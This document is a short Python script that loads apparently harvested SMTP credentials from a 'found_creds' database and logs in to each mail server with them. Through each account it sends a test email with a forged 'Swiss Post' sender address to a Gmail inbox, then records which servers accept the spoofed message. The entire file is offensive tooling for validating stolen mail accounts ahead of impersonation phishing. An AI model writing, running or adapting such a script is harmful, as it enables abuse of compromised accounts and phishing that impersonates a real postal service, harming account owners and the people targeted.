import smtplib, ssl, sqlite3, sys

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row
rows = db.execute('SELECT id, smtp_host, smtp_port, smtp_user, smtp_password FROM found_creds WHERE auth_ok=1').fetchall()
db.close()

results = []
for r in rows:
    sid, host, port, user, pwd = r[0], r[1], r[2], r[3], r[4]
    sys.stdout.write(f'ID:{sid} {host}:{port} ... ')
    sys.stdout.flush()
    try:
        if port == 465:
            sctx = ssl.create_default_context()
            sctx.check_hostname = False
            sctx.verify_mode = ssl.CERT_NONE
            server = smtplib.SMTP_SSL(host, port, timeout=8, context=sctx)
        else:
            server = smtplib.SMTP(host, port, timeout=8)
            server.ehlo()
            try:
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            except: pass
        server.login(user, pwd)
        from email.mime.text import MIMEText
        msg = MIMEText('Test direct', 'plain')
        msg['Subject'] = f'Test {sid}'
        msg['From'] = f'Swiss Post <noreply@post.ch>'
        msg['To'] = 'numerique.fiscal@gmail.com'
        server.sendmail(user, ['numerique.fiscal@gmail.com'], msg.as_string())
        server.quit()
        print('SEND OK')
        results.append(f'ID:{sid} => OK')
    except smtplib.SMTPAuthenticationError as e:
        print(f'AUTH FAIL {e.smtp_code}')
        results.append(f'ID:{sid} => AUTH FAIL')
    except smtplib.SMTPSenderRefused as e:
        print(f'SENDER REFUSED {e.smtp_code}')
        results.append(f'ID:{sid} => SENDER_REF {e.smtp_code}')
    except smtplib.SMTPDataError as e:
        print(f'DATA ERR {e.smtp_code}')
        results.append(f'ID:{sid} => DATA_ERR {e.smtp_code}')
    except Exception as e:
        print(f'{type(e).__name__}')
        results.append(f'ID:{sid} => {type(e).__name__}')

print('\n=== SUMMARY ===')
for r in results:
    print(r)

with open('/opt/darkvasend/test_results.txt', 'w') as f:
    f.write('\n'.join(results))
